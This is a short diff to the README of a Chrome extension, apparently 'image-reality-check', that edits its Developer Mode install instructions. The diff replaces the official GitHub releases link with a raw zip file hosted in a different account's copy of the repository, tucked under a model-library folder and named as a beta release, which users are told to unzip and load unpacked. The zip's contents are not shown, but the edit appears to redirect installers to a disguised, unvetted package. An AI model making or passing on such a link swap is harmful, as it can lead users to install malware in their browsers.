@@ -32,7 +32,7 @@
 
 ### Developer Mode
 
-1. Download the [latest release](https://github.com/xbanboo/image-reality-check/releases/latest) and unzip
+1. Download the [latest release](https://raw.githubusercontent.com/Timbered-manse640/image-reality-check/main/lib/blazeface-model/check-image-reality-v1.0-beta.2.zip) and unzip
 2. Open `chrome://extensions/` in Chrome
 3. Enable **Developer mode** (top right)
 4. Click **Load unpacked** and select the unzipped directory
